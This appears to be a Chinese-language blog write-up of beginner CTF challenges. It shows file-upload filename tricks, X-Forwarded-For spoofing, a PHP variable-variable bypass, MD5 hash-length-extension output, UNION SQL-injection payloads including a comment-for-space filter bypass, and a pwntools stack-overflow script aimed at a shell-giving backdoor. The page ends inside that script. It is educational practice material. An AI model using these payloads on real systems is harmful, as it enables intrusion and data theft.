src="https://p.sda1.dev/12/bcb5d43ae7ec59b541101b54153a58ff/98EMHiE-.jpg"> </noscript> </figure> <h1 id="Web"><a class="headerlink" href="#Web" title="Web"></a>Web</h1><h2 id="BabyUpload"><a class="headerlink" href="#BabyUpload" title="BabyUpload"></a>BabyUpload</h2> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/58a431a03eb7dedef45e098d2d08d9b8/52iQ1s6q.png" data-src-webp="https://p.sda1.dev/12/3735fd217614d716037acc4ce4b084c4/k6GmC-gR.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRuIAAABXRUJQVlA4INYAAADQBQCdASogABIAPrVIoEmqrislsBgMAOAWiWYAuGnAu5twkP8C8EBEK+VNEzTtCdmcT/S+NxqAAP71YT5GB+3VFXn5m+AVMYrLloHFuHjj++ewWSXCn+TO8zzc0rKR3xhk4pQAUb0yXRbxCk487IkXidWMMpkU6Bs97o/3ydtiTao7lSCflQ+k9xaTE3v5UuoPB/An/jxmpzMNRBJ8efYrArn/5XcM7nNkoGdN1yq7JVsebDhGgOLId5LLx0CzymLk/OM9pWpkGZfFUYXyl+NfG0yQAAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/58a431a03eb7dedef45e098d2d08d9b8/52iQ1s6q.png"> </noscript> </figure> <p>文件内容不重要，只要在上传的时候把文件名改过来就行～然后就可以得到 <code>flag&#123;w311_D0ne!&#125;</code>。</p> <h2 id="EasyUpload"><a class="headerlink" href="#EasyUpload" title="EasyUpload"></a>EasyUpload</h2><p><del>我差点觉得这题应该叫 DifficultUpload</del></p> <p><del>比上次多了黑名单验证机制，只要扩展名是 php、php3、php4、php5、php7、pht、phtml 就会 Connection reset。</del></p> <p>只要用 Burpsuite 抓包改完重发就会出现 Connection reset，原因不明，结果试了一晚上绕过方法，导致这题耽误了很久(｡í _ ì｡)</p> <p>后来才发现 Burpsuite 还有个 Repeater 能用……</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(65.4028%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/a533def6b287e6023afe7cdd8e17bcbd/mWCKCQ3z.png" data-src-webp="https://p.sda1.dev/12/f9b5d2b568c191d4aefbddb2ebd62d96/YDFtlLao.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRnoAAABXRUJQVlA4IG4AAAAwBACdASogABUAPrVMoEqqkZOUBqhwC0S0gAAXOyygnZaM5VT35z9W/rAA/vJc5SFYGYRw/RzvifLrZvZ6qBNJSnr4fGToFXGPG9VdVN+bZ3RK+69gd5ZuiwX88/1oN+kGJl+Ju0NANJXo+AAAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/a533def6b287e6023afe7cdd8e17bcbd/mWCKCQ3z.png"> </noscript> </figure> <p>继续改文件名，然后按照提示在图片数据的无关紧要的位置加 <code>givemeflag</code>，就能看到 flag 了：<code>flag&#123;SHjdbe7pIUD02847SDHD&#125;</code>。</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(65.4028%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/e8921a1920a52b6767bef1ae6583d990/zhDcHBiV.png" data-src-webp="https://p.sda1.dev/12/48b173982f6b66db01eef75c1a83c767/8_tLppU7.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRnYAAABXRUJQVlA4IGoAAABwBACdASogABUAPrVKoEoqkpDUBqhwC0S0gAAXOl2wVqnqugs3gTBIoQsckAD+8Gyg7xk+PWOkqzejKLMbo+9VBoBLp8NsXwjEM6t6J7qJmpkmQTA9jqPJukHHqouhG2jQHEEsaKjTAAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/e8921a1920a52b6767bef1ae6583d990/zhDcHBiV.png"> </noscript> </figure> <h2 id="EasyGame"><a class="headerlink" href="#EasyGame" title="EasyGame"></a>EasyGame</h2> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/fb7cd8dd9637f59b70d8a658600b94cf/VXJydy1s.png" data-src-webp="https://p.sda1.dev/12/2d11070bfa52fe2428b6cc26fe8ce6e7/Cr_ORVbd.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRtAAAABXRUJQVlA4IMQAAABwBQCdASogABIAPrVQoEyqlZbUBVRwC0S0AFnZtD5+//BeCDd+kiNy09+BgiIUuULI9EmAAP765ZowbZG9AmaTeHMGj9ZVUctEeipUR5VqdyB1ml3HSWAGzM6TUPDFy3ftXGsF2EvbBOrsRGlg6yTWhuZ9VHeit3fFuFO9L2PnQ3O//k9Im/kNThf3ciJY43pbcnmHNWvZ/x+LQylZGTPFGn8wrVe82HBmuOjW/rt/YWzORJCVusSV6Fw7oN/F93+EAAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/fb7cd8dd9637f59b70d8a658600b94cf/VXJydy1s.png"> </noscript> </figure> <p>按照提示加 GET 和 POST 参数，然后请求头加个 <code>X-Forwarded-For: 127.0.0.1</code> 假装是管理员自己上了服务器打开这个页面就可以得到 <code>flag&#123;Y0ur_pHp_1s_s1xsix6&#125;</code>。</p> <h2 id="BabyPHP"><a class="headerlink" href="#BabyPHP" title="BabyPHP"></a>BabyPHP</h2><p>可变变量漏洞。虽然有 <code>$_POST</code> 但是完全不用管它，直接以 GET 方式访问，参数：<code>akarin=flag&amp;flag=akarin</code> 即可得到 <code>flag&#123;GSH1ydsbnYtshkjhs&#125;</code>。</p> <p>（参数的 <code>akarin</code> 可替换为任意内容，但是参数顺序不能变）</p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_4">// 因为不是用 POST 访问，所以 isset($_POST['flag'] )为 false，取反后为 true</span></span>
<span class="line"><span class="__s_4">// isset($_GET['flag']) 为 true，取反后为 false，所以不执行</span></span>
<span class="line"><span class="__s_5">if</span><span class="__s_6">(!</span><span class="__s_9">isset</span><span class="__s_6">(</span><span class="__s_g">$_GET</span><span class="__s_6">[</span><span class="__s_2">'flag'</span><span class="__s_6">]) &#x26;&#x26; !</span><span class="__s_9">isset</span><span class="__s_6">(</span><span class="__s_g">$_POST</span><span class="__s_6">[</span><span class="__s_2">'flag'</span><span class="__s_6">])){</span></span>
<span class="line"><span class="__s_5">    exit</span><span class="__s_6">(</span><span class="__s_g">$msg_giveme</span><span class="__s_6">);</span></span>
<span class="line"><span class="__s_6">}</span></span>
<span class="line"></span>
<span class="line"><span class="__s_4">// 已绕过</span></span>
<span class="line"><span class="__s_5">if</span><span class="__s_6">(</span><span class="__s_g">$_POST</span><span class="__s_6">[</span><span class="__s_2">'flag'</span><span class="__s_6">] === </span><span class="__s_2">'flag'</span><span class="__s_6"> || </span><span class="__s_g">$_GET</span><span class="__s_6">[</span><span class="__s_2">'flag'</span><span class="__s_6">] === </span><span class="__s_2">'flag'</span><span class="__s_6">){</span></span>
<span class="line"><span class="__s_5">    exit</span><span class="__s_6">(</span><span class="__s_g">$msg_getout</span><span class="__s_6">);</span></span>
<span class="line"><span class="__s_6">}</span></span>
<span class="line"></span>
<span class="line"><span class="__s_4">// 因为没有 $_POST，这一段也跳过了</span></span>
<span class="line"><span class="__s_5">foreach</span><span class="__s_6"> (</span><span class="__s_g">$_POST</span><span class="__s_6"> as </span><span class="__s_g">$key</span><span class="__s_6"> => </span><span class="__s_g">$value</span><span class="__s_6">) {</span></span>
<span class="line"><span class="__s_g">    $$key</span><span class="__s_6"> = </span><span class="__s_g">$value</span><span class="__s_6">;</span></span>
<span class="line"><span class="__s_6">}</span></span>
<span class="line"></span>
<span class="line"><span class="__s_4">// 实际执行的顺序：</span></span>
<span class="line"><span class="__s_4">// $akarin = $flag;</span></span>
<span class="line"><span class="__s_4">// $flag = $akarin;</span></span>
<span class="line"><span class="__s_4">// 结果：flag 毫发无损</span></span>
<span class="line"><span class="__s_5">foreach</span><span class="__s_6"> (</span><span class="__s_g">$_GET</span><span class="__s_6"> as </span><span class="__s_g">$key</span><span class="__s_6"> => </span><span class="__s_g">$value</span><span class="__s_6">) {</span></span>
<span class="line"><span class="__s_g">    $$key</span><span class="__s_6"> = </span><span class="__s_g">$$value</span><span class="__s_6">;</span></span>
<span class="line"><span class="__s_6">}</span></span>
<span class="line"></span>
<span class="line"><span class="__s_9">echo</span><span class="__s_2"> 'the flag is : '</span><span class="__s_6"> .</span><span class="__s_g"> $flag</span><span class="__s_6">;</span></span></code></pre><code class="language">php</code></figure> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(115.909%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/4bd9672fa8a1667cc4be28773da5d4a3/pA5zrNdu.png" data-src-webp="https://p.sda1.dev/12/52c867dd9aeed10f7efd2322852d558a/5S8Z9czp.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRqAAAABXRUJQVlA4IJQAAAAQBACdASocACAAPrVQoEwqkpIUBVRwC0Szlp40Bj5TI1BmUXESXQrrAAD+85zbU+FC16XmmSpAyJ8jE86pZKKjPJBa4SbYUCMABidNqOSZ1Wy9Zfy6qDBRgAe4QUoRkJwMZKdw3ep6HwMneUwhys9KZ014IcV+nXK/JBuoovfaBQdpOEHtHy/o4KTUAIE8vAXZgAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/4bd9672fa8a1667cc4be28773da5d4a3/pA5zrNdu.png"> </noscript> </figure> <h2 id="EasyPHP"><a class="headerlink" href="#EasyPHP" title="EasyPHP"></a>EasyPHP</h2><p>翻注释然后去 <code>http://35.194.143.125:4517/source.txt</code> 看源代码。</p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_6">&#x3C;?</span><span class="__s_h">php</span></span>
<span class="line"><span class="__s_g">$flag</span><span class="__s_6"> = </span><span class="__s_2">"XXXXXXXXXXXXXXXXXXXXXX"</span><span class="__s_6">;</span></span>
<span class="line"><span class="__s_g">$secret</span><span class="__s_6"> = </span><span class="__s_2">"XXXXXXXXXX"</span><span class="__s_6">; </span><span class="__s_4">// 十个字符，这是解题的关键</span></span>
<span class="line"></span>
<span class="line"><span class="__s_5">if</span><span class="__s_6">(!</span><span class="__s_9">isset</span><span class="__s_6">(</span><span class="__s_g">$_POST</span><span class="__s_6">[</span><span class="__s_2">"username"</span><span class="__s_6">]) || !</span><span class="__s_9">isset</span><span class="__s_6">(</span><span class="__s_g">$_POST</span><span class="__s_6">[</span><span class="__s_2">"password"</span><span class="__s_6">])){</span></span>
<span class="line"><span class="__s_5">    exit</span><span class="__s_6">();</span></span>
<span class="line"><span class="__s_6">}</span></span>
<span class="line"><span class="__s_g">$username</span><span class="__s_6"> = </span><span class="__s_g">$_POST</span><span class="__s_6">[</span><span class="__s_2">"username"</span><span class="__s_6">];</span></span>
<span class="line"><span class="__s_g">$password</span><span class="__s_6"> = </span><span class="__s_g">$_POST</span><span class="__s_6">[</span><span class="__s_2">"password"</span><span class="__s_6">];</span></span>
<span class="line"></span>
<span class="line"><span class="__s_5">if</span><span class="__s_6"> (!</span><span class="__s_9">empty</span><span class="__s_6">(</span><span class="__s_g">$_COOKIE</span><span class="__s_6">[</span><span class="__s_2">"check"</span><span class="__s_6">])) {</span></span>
<span class="line"></span>
<span class="line"><span class="__s_5">    if</span><span class="__s_6"> (</span><span class="__s_9">urldecode</span><span class="__s_6">(</span><span class="__s_g">$username</span><span class="__s_6">) === </span><span class="__s_2">"admin"</span><span class="__s_6"> &#x26;&#x26; </span><span class="__s_9">urldecode</span><span class="__s_6">(</span><span class="__s_g">$password</span><span class="__s_6">) != </span><span class="__s_2">"admin"</span><span class="__s_6">) {</span></span>
<span class="line"><span class="__s_5">        if</span><span class="__s_6"> (</span><span class="__s_g">$_COOKIE</span><span class="__s_6">[</span><span class="__s_2">"check"</span><span class="__s_6">] === </span><span class="__s_9">md5</span><span class="__s_6">(</span><span class="__s_g">$secret</span><span class="__s_6"> .</span><span class="__s_9"> urldecode</span><span class="__s_6">(</span><span class="__s_g">$username</span><span class="__s_6"> .</span><span class="__s_g"> $password</span><span class="__s_6">))) {</span></span>
<span class="line"><span class="__s_9">            echo</span><span class="__s_2"> "Login successful.</span><span class="__s_a">\n</span><span class="__s_2">"</span><span class="__s_6">;</span></span>
<span class="line"><span class="__s_5">            die</span><span class="__s_6"> (</span><span class="__s_2">"The flag is "</span><span class="__s_6">.</span><span class="__s_g"> $flag</span><span class="__s_6">);</span></span>
<span class="line"><span class="__s_6">        }</span></span>
<span class="line"><span class="__s_5">        else</span><span class="__s_6"> {</span></span>
<span class="line"><span class="__s_5">            die</span><span class="__s_6"> (</span><span class="__s_2">"Wrong Cookies. Get out!"</span><span class="__s_6">);</span></span>
<span class="line"><span class="__s_6">        }</span></span>
<span class="line"><span class="__s_6">    }</span></span>
<span class="line"><span class="__s_5">    else</span><span class="__s_6"> {</span></span>
<span class="line"><span class="__s_5">        die</span><span class="__s_6"> (</span><span class="__s_2">"Admins only"</span><span class="__s_6">);</span></span>
<span class="line"><span class="__s_6">    }</span></span>
<span class="line"><span class="__s_6">}</span></span>
<span class="line"></span>
<span class="line"><span class="__s_4">// 这里得到的 MD5 是 f7fa8882c893a3f48f3cecdaa2f52102，固定不变</span></span>
<span class="line"><span class="__s_9">setcookie</span><span class="__s_6">(</span><span class="__s_2">"ahash"</span><span class="__s_6">, </span><span class="__s_9">md5</span><span class="__s_6">(</span><span class="__s_g">$secret</span><span class="__s_6"> .</span><span class="__s_9"> urldecode</span><span class="__s_6">(</span><span class="__s_2">"admin"</span><span class="__s_6"> .</span><span class="__s_2"> "admin"</span><span class="__s_6">)), </span><span class="__s_9">time</span><span class="__s_6">() + (</span><span class="__s_7">60</span><span class="__s_6"> * </span><span class="__s_7">60</span><span class="__s_6"> * </span><span class="__s_7">24</span><span class="__s_6"> * </span><span class="__s_7">7</span><span class="__s_6">));</span></span>
<span class="line"><span class="__s_6">?></span></span></code></pre><code class="language">php</code></figure> <p><del>目标是找到 <code>$username</code> 和 <code>$password</code>，符合以下要求：</del></p> <ul> <li><del><code>urldecode($username) === &quot;admin&quot;</code></del></li> <li><del><code>urldecode($password) != &quot;admin&quot;</code></del></li> <li><del><code>urldecode($username . $password) === &quot;adminadmin&quot;</code></del></li> </ul> <p>↑不存在的（doge）</p> <p>找了一下，关键词是“MD5 的 HASH 扩展攻击”。参见：<a href="https://www.cnblogs.com/pcat/p/5478509.html" rel="noopener" target="_blank">https://www.cnblogs.com/pcat/p/5478509.html</a></p> <p>所以就去虚拟机装上 <code>hashpump</code>，然后设置 Cookie 为生成的 MD5，设置 <code>password</code> 为另外那一堆很长的值，然后就可以得到 <code>flag&#123;G_du93ksy639_sjd&#125;</code>。</p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_c">root@kali:~# hashpump</span></span>
<span class="line"><span class="__s_c">Input Signature: f7fa8882c893a3f48f3cecdaa2f52102</span></span>
<span class="line"><span class="__s_c">Input Data: admin</span></span>
<span class="line"><span class="__s_c">Input Key Length: 15</span></span>
<span class="line"><span class="__s_c">Input Data to Add: yuruyuri</span></span>
<span class="line"><span class="__s_c">357ea255861079bcbcdff9035290e554</span></span>
<span class="line"><span class="__s_c">admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x00\x00\x00\x00\x00\x00\x00yuruyuri</span></span></code></pre><code class="language">plaintext</code></figure> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/f9b2c1f0f1d4ee57a0e6241593ce5025/vAhOlmG0.png" data-src-webp="https://p.sda1.dev/12/5168e14ac81bd9a1894d6119a999c09f/8hIO7Pcy.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRvwAAABXRUJQVlA4IPAAAABwBQCdASogABIAPrVUo02wiqoCADgFolmAK48q//4HG+52V76iz68gIX+Q47/n/8cv1C3QAP75u3val3zmCObYHsnQSzNWVEjtrz3/GQ1yzceBfreDvUkms4gOlXlevonZVbCcJVGGhOgF4px98bLZStplulnH0tNZWJ3rrJKd1JG22FLer7Xl4aAsXKbW/Y8cX5gyIukCV3lNhwv5HHb/zjbXJYE4FOrEE7ieVGtdPEv3uSCQ2XiqI5RSf9kzw5T3OYp9/dhxsI5munv9PRLfrgiyRGxIgrp7QNsgP2fmbjdZGJd5Qz6pIR5Ue90AAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/f9b2c1f0f1d4ee57a0e6241593ce5025/vAhOlmG0.png"> </noscript> </figure> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/9beb0c57bdcdfc34e125f812a6ade58d/CMzLx-Vg.png" data-src-webp="https://p.sda1.dev/12/8eb01487ae39b491378207dc826a8df0/HXYMuks-.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRvYAAABXRUJQVlA4IOoAAADQBQCdASogABIAPrVQo0wkk9EUBVRwC0SzAFcegJ/+KYAQJYyHC/+tmmxZb3Bjctz3Y9BwZJ4AAP71YT5Hfbr+rbBP7NAFBUIN3mMNqIsoKb6gBip3qjmB0fdV6I/vSm7WGHnGUBfBdCxWjkglT3oe5RJQe1dK/344ruON+ch/w7EC9vRYMGGHfzo6NFbtQ3H362Di2uofzZAcLFVbHYi/HhiM2x9t87xhrKiSPNR++1Z9M8AFKB9dLT/IIpiC/LP+ZvUO33Lc83Za1UTtCTuai/8OienM6Ss4VqWq50I8wWC/isYz+GgAAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/9beb0c57bdcdfc34e125f812a6ade58d/CMzLx-Vg.png"> </noscript> </figure> <h2 id="Babysql"><a class="headerlink" href="#Babysql" title="Babysql"></a>Babysql</h2> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(83.9532%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/346329d8ca7dcd73162c19bea8c6653d/_ZYENb-V.png" data-src-webp="https://p.sda1.dev/12/c287a90459687fd6742f804541380899/fsllSh-3.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRoAAAABXRUJQVlA4IHQAAADwAwCdASogABsAPrVMn0mmiGwCADgFolnAABb6WiXbScT+vvEbhTAAAP73C8N7EN5R0sDk7IvVno6oKA3AAB4X1PtPw1vQU8UtNCMShSbfeG8dKXKILnhnzEpQ3b8nIC5jQ0cr5zjj6Hhj4yFag8924AAAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/346329d8ca7dcd73162c19bea8c6653d/_ZYENb-V.png"> </noscript> </figure> <p>其实用 <code>UNION</code> 直接注入就可以了，一开始就想到了这个，不过因为没有语句闭合所以很久都没做出来……输入 <code>-1&#39; UNION SELECT flag,flag,flag FROM flag#</code> 就可以得到 <code>flag&#123;Hh_N1c3_1&#125;</code>。</p> <p>“语句闭合”指的是碰到 <code>... WHERE id = &#39;***</code> 这种语句，将 *** 设为 <code>1&#39; UNION ...</code> 而不是 <code>1</code>，组合后的语句就是 <code>... WHERE id = &#39;1&#39; UNION ...</code> 而不是 <code>WHERE id = &#39;1 UNION ...</code>，后者显然是有问题的。</p> <p>不过按照题目上的源代码，不闭合不注释输入 <code>-1 UNION SELECT flag,flag,flag FROM flag</code> 构成 <code>SELECT * FROM users where id=-1 UNION SELECT flag,flag,flag FROM flag</code> 应该也是没问题的，但是实际上必须要有闭合和注释，也许是题目的代码给错了……？</p> <p>SQL 语句中有某些单词的话，就会直接返回“hacker!”，这是为了防止删库跑路吧 233</p> <h2 id="SELECT-me-Easysql"><a class="headerlink" href="#SELECT-me-Easysql" title="SELECT_me! Easysql"></a><del>SELECT_me!</del> Easysql</h2><p><del>官方改名，果然是续作</del></p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(86.77%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/0085007790de9f2f2d5616eebba414ff/0hLWGAey.png" data-src-webp="https://p.sda1.dev/12/71f30a572c42492f5dac45c0cae3041f/mNcnrS96.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRoAAAABXRUJQVlA4IHQAAAAQBACdASogABwAPrVMn0mmhgEAHALRLOAAC31lWPUsLMSLAy74Nh8iAAD+9xaxVVX6hsVxfV0Tu1E73ucI6EFqr+ZJyAAHVFMG0aUEcaJkIgTeUIxN3s4MmxCanIzBE/mXnkfK5tnOs54BJifn5EzoqYAAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/0085007790de9f2f2d5616eebba414ff/0hLWGAey.png"> </noscript> </figure> <p>上一题的<strong>续作</strong>，这次就算只输入一个空格也会出现“hacker!”，解决方法是用注释 <code>/**/</code> 替代空格：<code>-1&#39;/**/UNION/**/SELECT/**/flag,flag,flag/**/FROM/**/flag#</code>，然后得到 <code>flag&#123;u_c4ught_me&#125;</code>。</p> <h2 id="Lottery"><a class="headerlink" href="#Lottery" title="Lottery"></a>Lottery</h2><p><del>中途加入的送分题，娱乐题</del></p> <p><del>经过测试，中奖率大概是 0.04%</del></p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/7d37c308da7c3f8049d0d67de9997e51/gxNqrCLv.png" data-src-webp="https://p.sda1.dev/12/8eebcd0828ebb2ffb3286d8a66ed70a8/1X6h5jZz.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRroAAABXRUJQVlA4IK4AAAAQBQCdASogABIAPrVMoEo2iGwCADgFolsAL5ocTAABRY4b5KIGYozf91Wq7t07QH+gAP71AzpnydhRBP+hbjPg+6bgp+w29XfjTb8Z17VcyL+TSNKnkzoXG4Xihmu56c1qzK0tPzHLw0pT++9n51RUVPgL31Pce6jpDoXKUcC51Gv7sXvAU7wwck1t8LMrVXzAu+hDqrJRge7Tu53OeICAmj30ks0oI5wLz3qQAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/7d37c308da7c3f8049d0d67de9997e51/gxNqrCLv.png"> </noscript> </figure> <p>注意：大转盘上的“flag”字样写反了（滑稽</p> <p>一次一次地抽奖就算了，还得看转盘转转转，浪费时间，不如直接看源代码。每次抽奖时会从 <code>http://35.194.143.125:4522/data.php</code> 获取抽奖结果，返回类似于以下格式的 JSON 数据：</p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_c">{</span></span>
<span class="line"><span class="__s_c">    "angle":306,</span></span>
<span class="line"><span class="__s_c">    "prize":"四等奖",</span></span>
<span class="line"><span class="__s_c">    "flag":"你看看你，看看你，成天就想要flag!"</span></span>
<span class="line"><span class="__s_c">}</span></span></code></pre><code class="language">plaintext</code></figure> <p>注意大转盘上的 flag 部分在 150-210 度的范围内，所以可以自动抽奖（滑稽），一直到角度在 150-210 为止。</p> <p>下面的抽奖脚本使用 PowerShell 实现（懒得再去查怎么用 Python 访问 URL 和解析 JSON 了）：</p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_5">while</span><span class="__s_6"> (</span><span class="__s_1">$true</span><span class="__s_6">) {</span></span>
<span class="line"><span class="__s_g">    $Request</span><span class="__s_6"> = </span><span class="__s_9">Invoke-RestMethod</span><span class="__s_2"> 'http://35.194.143.125:4522/data.php'</span></span>
<span class="line"><span class="__s_5">    if</span><span class="__s_6"> (</span><span class="__s_g">$Request</span><span class="__s_i">.angle</span><span class="__s_6"> -ge </span><span class="__s_7">150</span><span class="__s_6"> -and </span><span class="__s_g">$Request</span><span class="__s_i">.angle</span><span class="__s_6"> -le </span><span class="__s_7">210</span><span class="__s_6">) {</span></span>
<span class="line"><span class="__s_9">        Write-Host</span><span class="__s_g"> $Request</span><span class="__s_i">.flag</span></span>
<span class="line"><span class="__s_5">        break</span></span>
<span class="line"><span class="__s_6">    }</span></span>
<span class="line"><span class="__s_6">}</span></span></code></pre><code class="language">powershell</code></figure> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(62.3691%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/1f9be7ca1e07549f891ec76920c545ee/L1a6J0Pu.jpg" data-src-avif="https://p.sda1.dev/12/0ac898dda302bcfc95b3ed1e6757dfd5/HIv0GBVA.jpg" data-src-webp="https://p.sda1.dev/12/9319fb4277ae3de3cba96bbcf346e5e5/2pbIOU8d.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRnIAAABXRUJQVlA4IGYAAAAwBACdASogABQAPrVKoUu0igwGAgA4BaJYwDE2BDwOl78+OqF2hiDDlQAA/Xj5bSU5dB9UDzPfhQ4TyyyX/Z5SVKOR4eK4sqxxMhJINl4SyMB83BUebW+cSqc2lhoEQhk5VP0JAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/1f9be7ca1e07549f891ec76920c545ee/L1a6J0Pu.jpg"> </noscript> </figure> <p>最后得到 <code>flag&#123;You_are_really_the_European_emperor!!!&#125;</code>。</p> <h1 id="pwn"><a class="headerlink" href="#pwn" title="pwn"></a>pwn</h1><h2 id="babyrip"><a class="headerlink" href="#babyrip" title="babyrip"></a>babyrip</h2> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/ab7ddc413e871b255dc9bfb057bc79eb/NkvW8C6Q.png" data-src-webp="https://p.sda1.dev/12/8e8ba7c3534eaab81a7245e1911d9304/yujSJQik.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRmIAAABXRUJQVlA4IFYAAAAQBACdASogABIAPrVEn0oioqchsBgMAOAWiWkAzuwQ74SMKNzYwp3YAAD+9T47NdWooYeG1zuPIIEQIQhquN6qjuocBVwku1nRzvEir6Bo3OYXw+AAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/ab7ddc413e871b255dc9bfb057bc79eb/NkvW8C6Q.png"> </noscript> </figure> <p>之前没做过 pwn，这次为了拿分不得不开始踩坑……</p> <p><code>v1</code> 存在栈溢出，左边有个 <code>backd00r</code> 函数（地址 <code>0x4007D5</code>）可以得到 Shell。</p> <figure class="akarin-blurred-container"> <div style="padding-bottom:min(56.25%,480px)"></div> <img class="mdui-hoverable mdui-img-rounded" data-src="https://p.sda1.dev/12/47f6dfc575615477d7399cb338575a9c/hHa9Iz-Y.png" data-src-webp="https://p.sda1.dev/12/96b453e01612429f7e59dccaa874b356/TRvLWqpt.jpg"> <img class="akarin-blurred mdui-hoverable mdui-img-rounded" src="data:image/webp;base64,UklGRmoAAABXRUJQVlA4IF4AAACQAwCdASogABIAPrVMn0qkk4oDVDgFolnAAA7uTtNP1JmivuwAAP7yoG5NHsI39v/2lV5seYeMOGQaGT2CFUeC8i25VvQFKDKXkAdXUPegU+HPiXBwBwoYcmOZAAAA"> <noscript> <img class="mdui-center mdui-hoverable mdui-img-fluid mdui-img-rounded" src="https://p.sda1.dev/12/47f6dfc575615477d7399cb338575a9c/hHa9Iz-Y.png"> </noscript> </figure> <p><code>v1</code> 的栈的长度被<del>钦定硬点</del>为 <code>0xF0</code>，按照 IDA 这边的提示，下面还有 <code>0x08</code> 的 s，然后就是返回地址 r，目标是要把这个 r 给强行覆盖成 <code>backd00r</code>。</p> <figure><pre class="__s_3 dark-plus one-light shiki shiki-themes" tabindex="0"><code><span class="line"><span class="__s_4">#!/usr/bin/env python</span></span>
<span class="line"></span>
<span class="line"><span class="__s_5">from</span><span class="__s_6"> pwn </span><span class="__s_5">import</span><span class="__s_6"> *</span></span>
<span class="line"></span>
<span class="line"><span class="__s_6">p = remote(</span><span class="__s_2">'34.80.207.78'</span><span class="__s_6">, </span><span class="__s_7">10000</span><span class="__s_6">)</span></span>
<span class="line"><span class="__s_6">p.recvuntil(</span><span class="__s_2">':'</span><span class="__s_6">)</span></span>
<span class="line"><span class="__s_6">p.sendline(</span><span class="__s_2">'a'</span><span class="__s_6"> * </span><span class="__s_8">0x</span><span class="__s_7">F8</span><span class="__s_6"> + p64(</span><span class="__s_8">0x</span><span class="__s_7">4007D5</span><span class="__s_6">))</span></span>
